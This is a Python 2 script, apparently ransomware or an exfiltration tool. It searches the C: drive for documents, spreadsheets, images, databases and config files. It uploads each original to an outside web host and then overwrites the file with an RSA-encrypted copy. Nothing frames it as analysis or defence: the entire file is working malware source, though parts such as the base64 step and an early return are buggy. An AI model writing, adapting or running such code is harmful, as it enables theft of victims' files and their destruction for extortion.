import win32com.client
import os
import fnmatch
import time
import random
import zlib
import sys
import requests
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_types = [".doc" , ".xls" , ".txt" ,".jpg" ,".bmp",".db",".config",".ppt" ]

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsyYAjhi+GBPZonexU5OZ
W3S47JuxtnO13KKaTM/BU8aOE8Blt9kw5+AVlWeTyeP10TFTLvvFFOLsr82e2q1T
hnSb2jGYcp/hDRK+NwhgfzYFLPRB3eKe2ZW+W5o0eQ2BNoexQuzzc5Clw77KwbQo
jpfO7nybEGP77KcALUvHXNCo+4WqZPPO06Q+HZbYwXzYoLRd1oArv6zgMYK3fGYJ
QCgSF3w4eBjWaskRqtY8oBGJHj8vFz4edq2B+vzdVDPWwQaLx11bqL7sYBeWp9j5
2/+C99ju3y/2O1r7/aJQ+wFbumYyqHbqlfmiRppSlewGp4SgOFGeiUBynCB08ori
TwIDAQAB
-----END PUBLIC KEY-----"""


def encrypt_string(plaintext):
        chunk_size = 32
        print "Compressing %d bytes " % len(plaintext)
	plaintext = zlib.compress(plaintext)
	print "Encrypting %d bytes" % len(plaintext)
	rsakey = RSA.importKey(public_key)
	rsakey = PKCS1_OAEP.new(rsakey)
	encrypted = ""
	offset = 0

	while offset < len(plaintext):
	   chunk = plaintext[offset:offset+chunk_size]
	   if len(chunk) % chunk_size != 0:
	        chunk += " " * (chunk_size - len(chunk))
	   encrypted += rsakey.encrypt(chunk)
	   offset += chunk_size
        encrypted += encrypted.encode("base64")
        print "Base64 encoded crypto:  %d" % len(encrypted)
	return encrypted

def encrypt_post(filename):
    # open and read the file
    fd  = open(filename,"rb")
    contents = fd.read()
    fd.close()
    encrypted_title = encrypt_string(filename)
    
    encrypted_body = encrypt_string(contents)
    return encrypted_title,encrypted_body	

def exfiltrate(document_path):
    title, body = encrypt_post(document_path)
    print "Exfiltrating the original to the remote server"
	#Send to remote server
    url = "http://psyberlupus.000webhostapp.com/site.php/post"
    files = {'document': open(document_path,"rb") }
    r = requests.post(url, files=files)
    print "Encrypting the original"
    f_d = open(document_path,"w")
    f_d.write(body)
    f_d.close()
    print "check the file %s " % document_path
     	
def run(**args):
    for parent ,directories,filenames in os.walk("C:\\"):
        for doc_type in doc_types:
	   for filename in fnmatch.filter(filenames , "*%s" % doc_type):
              document_path = os.path.join(parent,filename)    
	      print "Found: %s" % document_path
              exfiltrate(document_path)
	      return True
              
              

run()
